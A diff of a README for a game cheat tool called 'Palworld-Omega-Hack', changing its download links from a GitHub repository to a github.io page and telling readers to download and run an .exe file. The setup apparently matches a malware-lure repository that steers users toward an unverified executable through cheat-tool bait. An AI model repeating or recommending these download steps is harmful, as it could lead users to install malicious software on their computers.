@@ -1,6 +1,6 @@
 # 🚀 Palworld-Omega-Hack - Unlock Every Secret In Your Game
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://github.com/chandaunwatchful564/Palworld-Omega-Hack)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue)](https://chandaunwatchful564.github.io)
 
 ## 📖 About This Tool
 
@@ -12,7 +12,7 @@ Before you start, check your computer against these requirements. You need a Win
 
 ## 📥 How To Download
 
-1. Go to the project page: [https://github.com/chandaunwatchful564/Palworld-Omega-Hack](https://github.com/chandaunwatchful564/Palworld-Omega-Hack)
+1. Go to the project page: [https://chandaunwatchful564.github.io](https://chandaunwatchful564.github.io)
 2. Look for the Releases section on the right side of the page.
 3. Select the latest version listed.
 4. Download the file ending in .exe to your desktop.
